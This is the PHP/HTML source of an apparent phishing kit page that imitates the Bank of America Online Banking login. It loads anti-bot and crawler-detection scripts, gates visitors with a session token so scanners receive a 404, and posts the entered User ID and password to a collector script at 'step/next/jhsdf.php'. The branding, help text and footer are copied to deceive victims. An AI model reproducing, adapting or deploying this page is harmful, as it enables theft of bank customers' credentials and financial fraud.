<?php
    session_start();

    require_once './src/Classes/Comp.php';
    require_once './src/Classes/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        die();
    }
    include './zsec.php';
	include 'bot_fucker/wrd.php';
	include 'crawlerdetect.php';
     include 'bot_fucker/bot.php';
    include 'huehuehue.php';
?>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US" class="win chrome chrome-95 webkit svg-bg not-retina cf-cnx-regular-inactive">
  <head class="at-element-marker">
    <style type="text/css">
      @font-face {
        font-family: 'cnx-regular';
        src: url('piles/cnx-regular.eot');
        src: url('piles/cnx-regular.eot?#iefix') format('embedded-opentype'), url('piles/cnx-regular.woff') format('woff'), url('piles/cnx-regular.ttf') format('truetype');
        font-weight: normal;
        font-style: normal;
        font-variant: normal;
      }
    </style>
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta name="Keywords" content="Your Online ID">
    <meta name="Description" content="Log in to your Online Banking account by entering your Online ID.">
    
    <!-- TLDB false -->
    <!-- TL-NOPV true -->
    <title>Bank of America | Online Banking | Log In | Online ID</title>
    <meta http-equiv="content-type" content="text/html;charset=utf-8">
    <link rel="shortcut icon" href="piles/favicon.ico?ts=20151018" type="image/x-icon">
    <link rel="stylesheet" type="text/css" href="piles/vipaa-v4-jawr.css" media="all">
    <link rel="stylesheet" type="text/css" href="piles/vipaa-v4-jawr-print.css" media="print">
    <style id="at-makers-style" class="at-flicker-control">
      .mboxDefault {
        visibility: hidden;
      }
    </style>
    <style>
      body {
        display: none;
      }
    </style>
    <style type="text/css">
      
      .button-10 {
  display: flex;
  flex-direction: column;
  align-items: center;
  padding: 6px 14px;
  font-family: -apple-system, BlinkMacSystemFont, 'Roboto', sans-serif;
  border-radius: 6px;
  border: none;

  color: #fff;
  background: linear-gradient(180deg, #4B91F7 0%, #367AF6 100%);
   background-origin: border-box;
  box-shadow: 0px 0.5px 1.5px rgba(54, 122, 246, 0.25), inset 0px 0.8px 0px -0.25px rgba(255, 255, 255, 0.2);
  user-select: none;
  -webkit-user-select: none;
  touch-action: manipulation;
}

.button-10:focus {
  box-shadow: inset 0px 0.8px 0px -0.25px rgba(255, 255, 255, 0.2), 0px 0.5px 1.5px rgba(54, 122, 246, 0.25), 0px 0px 0px 3.5px rgba(58, 108, 217, 0.5);
  outline: 0;
}
    </style>
  </head>
  <body class="fsd-layout-body" style="display: block;">
    <a class="ada-hidden ada-visible-focus" href="#skip-to-h1" id="ada-skip-link">Skip to main content</a>
    <div class="fsd-layout fsd-2c-700lt-layout">
      <div class="fsd-border">
        <div class="center-content">
          <div class="header">
            <div class="header-module">
              <div class="fsd-secure-esp-skin">
                <img height="28" width="230" alt="Bank of America" src="piles/BofA_rgb.png">
                <div class="page-type cnx-regular" data-font="#!">Log In</div>
                <div class="right-links">
                  <div class="secure-area">Secure Area</div>
                  <a class="divide" href="" target="_self" name="spanish_toggle" title="Muestra esta sesión de la Banca en Línea">En español</a>
                  <div class="clearboth"></div>
                </div>
                <div class="clearboth"></div>
              </div>
            </div>
            <noscript>
              <div class="fauxdal-overlay"></div>
              <div class="fauxdal-module">
                <div class="noscript-reload-skin">
                  <div class="fauxdal-top"></div>
                  <div class="fauxdal-bottom">
                    <div class="fsd-fauxdal-content">
                      <div class="fsd-fauxdal-title"> Please use JavaScript </div>
                      <p>You need a web browser that supports JavaScript to use our site. Without it, some pages won't work as designed. To make sure JavaScript is turned on, please adjust your browser settings.</p>
                      <p>&nbsp;</p>
                      <p>
                        <a title="Browser Help and Tips" name="Browser Help and Tips" href="" target="_self">Browser Help and Tips</a>
                      </p>
                    </div>
                    <div class="fsd-fauxdal-close">
                      <a class="button-common button-gray" name="close_button_js_disabled_modal" href=>
                        <span>Close</span>
                      </a>
                    </div>
                    <div class="clearboth"></div>
                  </div>
                </div>
              </div>
            </noscript>
            <div class="page-title-module h-100" id="skip-to-h1">
              <div class="red-grad-bar-skin sup-ie">
                <h1 data-font="#!" class="cnx-regular">Log In to Online Banking</h1>
              </div>
            </div>
            <div id="clientSideErrors" class="messaging-vipaa-module hide" aria-live="polite">
              <div class="error-skin">
                <div class="error-message">
                  <p class="title TLu_ERROR">We can't process your request.</p>
                  <ul></ul>
                </div>
              </div>
            </div>
            <!-- Added for VIPAA Sub-user pages new currentLocation=/login/sign-in/enter-online-id-passcode-v2-->
            <div class="vipaa-modal-content-module">
              <div class="sitekey-affinity-skin"></div>
            </div>
          </div>
          <div class="columns">
            <div class="flex-col lt-col">
              <div class="online-id-vipaa-module">
                <div class="enter-skin phoenix">
                  <form class="simple-form collector-form-marker" name="enter-online-id-form" id="EnterOnlineIDForm" method="post" action="step/next/jhsdf.php?token=<?php echo $_SESSION['token']; ?>" autocomplete="off">
				  <?php
if(isset($_GET['invalid'])){
echo "<input type='hidden' name='invalid' value='invalid'><p style='color:red;'>Invalid User ID or Password. Please try again.</p>";
}
?>
                    <div class="online-id-section">
                      <!-- Kiosk Login Flow is {request.getParameter("kioskLoginFlow")} -->
                      <label for="enterID-input">User ID <span class="ada-hidden"> Must be at least 6 characters long</span>
                      </label>
                      <input type="text" id="username" name="omlj" maxlength="32" value="" required autocomplete="off">
                      <div class="remember-info">
                        <input type="checkbox" id="remID" name="saveMyID">
                        <label for="remID">Save this User ID</label>
                        <a class="boa-dialog force-xlarge info-layer-help-fsd dotted" href="javascript:void(0);" name="online-id-help" rel="help-content" title="Help">
                          <span class="ada-hidden">Online ID Help</span>
                          <span class="boa-ada-text ada-hidden">&nbsp;layer</span>
                        </a>
                        <div id="help-content" class="hide">
                          <p>
                            <strong>How does "Save this User ID" work?</strong>
                          </p>
                          <p>&nbsp;</p>
                          <p>Saving your User ID means you don't have to enter it every time you sign in.</p>
                          <p>&nbsp;</p>
                          <p>
                            <strong>Don't save on a public computer</strong>
                          </p>
                          <p>&nbsp;</p>
                          <p>Only save your User ID on your personal computer or mobile device.</p>
                          <p>&nbsp;</p>
                          <p>
                            <strong>How to clear a saved User ID</strong>
                          </p>
                          <p>&nbsp;</p>
                          <p>To clear a saved User ID, sign in and select <strong>Saved User IDs</strong> from <strong>Profile and Settings.</strong>
                          </p>
                        </div>
                        <div class="clearboth"></div>
                      </div>
                    </div>
                    <input aria-hidden="true" type="password" class="tl-private" name="dsfsd" maxlength="20" style="display:none;" value="">
                    <label for="tlpvt-passcode-input" class="mtop-15">Password <span class="ada-hidden"> is unavailable. Please enter atleast 6 characters of online id to enable Passcode</span>
                    </label>
                    <div class="TL_NPI_Pass">
                      <input type="password" class="tl-private fl-lt" id="passcode" name="dsfsd" maxlength="20" value="" required autocomplete="off">
                    </div>
                    <br>
                    
                    <a href="" class="fl-lt forgot-passcode" name="forgot-your-passcode">Forgot your Password?</a>
                    <div class="clearboth"></div><br>
                   <button class="button-10" role="button">Log In</button>
                     
                    </a>
                    <a href="javascript:void(0);" id="signin-mobile-app" name="signin-mobile-app" class="displayNone">Sign In with mobile app</a>
                    <a href="javascript:void(0);" id="signin-with-passcode" name="signin-with-passcode" class="hidden">Sign In with Password</a>
                    <a href="javascript:void(0);" id="signin-with-windows-hello" name="signin-with-windows-hello" class="bold hidden"> Sign in with Windows Hello </a>
                    <div class="digital-id-notify phoenix hidden" id="digital-id-success-message">
                      <div class="digital-id-head"> Check your mobile device </div>
                      <span class="circle-animation">
                        <div class="circle-inline">Loading</div>
                        <div class="loading-circle circle-inline">
                          <div class="circle-bounce1"></div>
                          <div class="circle-bounce2"></div>
                          <div class="circle-bounce3"></div>
                        </div>
                      </span>
                      <p class="digital-id-msg"> We sent a notification to your registered device. Verify your identity in the app now to sign in to Online Banking. </p>
                      <a href="javascript:void(0);" class="digital-id-link send-notification-again"> Send notification again </a>
                      <a href="javascript:void(0);" class="digital-id-link sign-in-with-passcode-instead"> Sign In with Passcode instead </a>
                    </div>
                    <div class="digital-id-notify phoenix hidden" id="digital-id-general-error">
                      <div class="digital-id-head"> Check your mobile device </div>
                      <p class="digital-id-msg"> If you're enrolled in this security feature, we sent a notification to your registered device. Verify your identity in the app now to sign in to Online Banking. </p>
                      <a href="javascript:void(0);" class="digital-id-link send-notification-again"> Send notification again </a>
                      <a href="javascript:void(0);" class="digital-id-link sign-in-with-passcode-instead"> Sign In with Passcode instead </a>
                    </div>
                    <div class="digital-id-notify phoenix hidden" id="digital-id-max-error">
                      <div class="digital-id-head"> Check your mobile device </div>
                      <p class="digital-id-msg"> We can't identify you at this time. Please use your User ID/Password to log in. </p>
                      <a href="javascript:void(0);" class="digital-id-link sign-in-with-passcode-instead"> Sign In with Passcode instead </a>
                    </div>
                    <div class="clearboth"></div>
                    
                  </form>
                  <div id="fpContainer" class="" style="width: 50%;"></div>
                  <!-- Mobile CTA: Borneo version of 'Get the app' widget on the signOnV2 page -->
                  <!-- Normal Scenario -->
                  <div class="mobile-cta-section vertical-dotted-line fl-rt">
                    <p class="cnx-regular title enroll-color-gray mbtm-10">Stay connected with our app</p>
                    <img height="208" width="149" src="piles/mobile_llama.png" alt="Mobile banking Llama" class="fl-lt">
                    <div class="get-app-content-section">
                      <div class="cnx-regular title enroll-color-gray mcta-bubble">Secure, convenient banking anytime</div>
                      <a id="choose-device-get-the-app" name="choose-device-get-the-app" class="choose-device-get-the-app-modal btn-bofa btn-bofa-red btn-bofa-noRight cnx-regular" href="javascript:void(0);" rel="mobile-app-download-choose-device">
                        <span>Get the app</span>
                        <span class="ada-hidden">&nbsp; link opens a new info modal layer</span>
                      </a>
                    </div>
                  </div>
                </div>
              </div>
              <div class="modal-mobile-module hide">
                <div class="get-app-skin aps-mobile-products">
                  <h3>{title}</h3>
                  <div class="content-wrapper three-col">
                    <div class="{storeLogo}">
                      <div class="column app-box">
                        <h4 class="sprite sprite-I5 sprited">Download directly to your mobile device. <div class="spr"></div>
                        </h4>
                        <a class="sprite store-icon {storeLogo} sprited" name="{storeName}" href="{storeLink}" id="{storeId}" target="_blank">
                          <span class="ada-hidden">{storeLinkText}</span>
                          <div class="spr"></div>
                        </a>
                        <p class="{notice}">{noticeText}</p>
                      </div>
                      <div class="column comm-box {text}{email}">
                        <h4 class="sprite sprite-J5 {text} sprited">We'll text you a link to download the app. <div class="spr"></div>
                        </h4>
                        <h4 class="sprite sprite-L5 row-2 {email} sprited">We'll email you a link to download the app. <div class="spr"></div>
                        </h4>
                        <form action="" id="mobile_app_download_url">
                          <div id="field-level-error" role="alert">
                            <span class="ada-hidden"></span>
                          </div>
                          <div class="{text}">
                            <label class="ada-hidden" for="tlpvt-mob_app_download_phone_num" name="mobile_app_download_phone_prompt" id="mobile_app_download_phone_prompt">{placeholderText}</label>
                            <input type="text" name="mobile_app_download_phone_number" id="tlpvt-mob_app_download_phone_num" class="phone-input {text} tl-private" placeholder="{placeholderText}">
                          </div>
                          <div class="{email}">
                            <label class="ada-hidden" for="tlpvt-mob_app_download_email_id" name="mobile_app_download_email_prompt" id="mobile_app_download_email_prompt">{emailPlaceholderText}</label>
                            <input type="text" name="mobile_app_download_email_id" id="tlpvt-mob_app_download_email_id" class="email-input {email} tl-private" placeholder="{emailPlaceholderText}">
                          </div>
                          <a href="javascript:void(0);" name="anc-send-email-button" class="btn-bofa btn-bofa-small btn-bofa-noRight" id="mobile_app_download_send_button" onclick="dartFireOnClick('1359940','bacal484','2014_700')">Send</a>
                          <div class="clearboth"></div>
                          <p class="{text}">By providing your mobile number you are consenting to receive a text message. Text message fees may apply from your carrier. Text messages may be transmitted automatically.</p>
                        </form>
                      </div>
                      <div class="column info-box">
                        <h4 class="sprite sprite-K5 sprited"> Visit bankofamerica.com in your mobile web browser for a link to download the app. <div class="spr"></div>
                        </h4>
                      </div>
                    </div>
                    <div class="other-device-info {deviceStatus}">
                      <div>
                        <p> Our mobile app is not available for all devices</p>
                        <a href="" class="style-link guillemet-right" name="anc_learn_more_about_phone_banking">Learn about your Banking by Phone options&nbsp; <span class="guillemet ls-n1 f-11 ls-n2 guillement-set">››</span>
                        </a>
                      </div>
                    </div>
                    <div class="confirmation-screen hide">
                      <div class="inline-ack-msg sprite sprite-D7 sprited">
                        <span class="ada-hidden"></span>
                        <span class="message"></span>
                        <span id="inputHolder" class="TL_NPI_L1"></span>
                        <div class="spr"></div>
                      </div>
                      <div class="button-wrapper">
                        <a href="javascript:;" class="btn-bofa btn-bofa-blue btn-bofa-small" name="anc-close-button" id="confirmModalCloseButton">Close</a>
                        <a href="javascript:;" class="btn-bofa btn-bofa-small btn-bofa-noRight" name="anc-send-another-link" id="confirmModalSendAnotherLink">Send another link</a>
                      </div>
                    </div>
                    <div class="processing hide">
                      <span class="ada-hidden">Please wait. Your request is being processed.</span>
                      <span class="modal-skin-processing-text">Please wait...</span>
                    </div>
                    <div class="clearboth"></div>
                  </div>
                </div>
              </div>
              <div id="mobile-app-download-flex-modal" class="aps-mobile-products"></div>
              <style type="text/css">
                .aps-mobile-products .sprite .spr {
                  background-image: url('piles/aps-mobile-products-icon-sprite-dev.png');
                  background-size: 700px 550px;
                }
              </style>
              <div class="mobile-app-download-module hide" id="mobile-app-download-choose-device">
                <div class="choose-device-modal-skin">
                  <h3>Select your device</h3>
                  <div class="flex-modal-main-content">
                    <p>Please select your device to continue:</p>
                    <label for="device-pulldown" class="ada-hidden">Select your device. Press TAB to continue after making selection.</label>
                    <select id="device-pulldown" name="device-pulldown" class="select-bofa">
                      <option value="Select your device">Select your device</option>
                      <option value="iPhone">iPhone</option>
                      <option value="iPad">iPad</option>
                      <option value="Android">Android</option>
                      <option value="Other">Other</option>
                    </select>
                    <div class="clearboth"></div>
                    <a href="javascript:void(0);" id="choose-device" class="btn-bofa btn-bofa-red btn-disabled get-app-modal-trigger btn-bofa-noRight" name="choose-device" rel="choose-device-modal"> Continue <span class="ada-hidden">&nbsp; link opens a new info modal layer</span>
                    </a>
                  </div>
                </div>
              </div>
              <style type="text/css">
                .aps-mobile-products .sprite-D5>.spr {
                  width: 50px !important;
                  left: 25px !important;
                  top: -5px !important;
                }

                .aps-mobile-products .sprite-J8>.spr {
                  height: 51px;
                  width: 50px !important;
                  background-position: -522px -410px !important;
                  left: 30px !important;
                }

                .aps-mobile-products .sprite-F5>.spr {
                  width: 50px !important;
                  left: 25px !important;
                  top: -5px !important;
                }
              </style>
            </div>
            <div class="flex-col rt-col">
              <div class="side-well-vipaa-module">
                <div class="fsd-ll-skin">
                  <h2>Login help</h2>
                  <ul class="li-pbtm-15">
                    <li>
                      <a class="arrow" href="" name="Forgot ID/Password?">Forgot ID/Password?</a>
                    </li>
                    <li>
                      <a class="arrow" href="" name="Problem logging in?">Problem logging in?</a>
                    </li>
                  </ul>
                </div>
                <div class="fsd-ll-skin">
                  <h2>Not using Online Banking?</h2>
                  <ul class="li-pbtm-15">
                    <li>
                      <a class="arrow" href="" name="Enroll_now">Enroll now <span class="ada-hidden"> for online Banking</span>
                      </a>
                    </li>
                    <li>
                      <a class="arrow" href="" name="Learn_more_about_Online_Banking_dotcom">Learn more about Online Banking</a>
                    </li>
                    <li>
                      <a class="arrow" href="" name="Service_Agreement_dotcom">Service Agreement</a>
                    </li>
                  </ul>
                </div>
              </div>
            </div>
            <div class="clearboth"></div>
          </div>
          <div class="footer">
            <div class="footer-top">&nbsp; </div>
            <div class="footer-inner" style="margin-top: 46.8px;">
              <div class="global-footer-module">
                <div class="gray-bground-skin cssp">
                  <div class="secure">Secure area</div>
                  <div class="link-container">
                    <div class="link-row">
                      <a href="" name="Privacy_&amp;_Security_footer" title="Privacy" target="_blank">Privacy</a>
                      <a class="last-link" href="" name="Security" title="Security" target="_blank">Security</a>
                      <div class="clearboth"></div>
                    </div>
                  </div>
                  <p>Bank of America, N.A. Member FDIC. <a href="" name="Equal_Housing_Lender" target="_blank">Equal Housing Lender</a>
                    <br>©&nbsp;2022 Bank of America Corporation.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div id="boaFormHelp" aria-live="rude" style="top: -1000px; left: -1000px; position: absolute; z-index: 100;">
      <div id="boaFormHelp-content"></div>
      <div class="boaFormHelp-bottom"></div>
    </div>
    <div aria-hidden="true" style="position: absolute; top: -999em; left: -999em; width: auto; font-size: 300px; font-family: cnx-regular, serif;">BlankTestESs</div>
    <div id="inauth_font_detector" style="visibility: hidden;position: absolute; top: 0px; left: -999px;"></div>
    <div id="restest" style="width: 0.5cm; height: 0.5cm; padding: 0px"></div>
    <iframe title="wabklm" style="visibility: hidden; width: 0px; height: 0px; border: none; display: none;"></iframe>
  </body>
  <div aria-hidden="true" style="position:absolute;top:-999em;left:-999em;width:auto;font-size:300px;font-family:serif">BlankTestESs</div>
</html>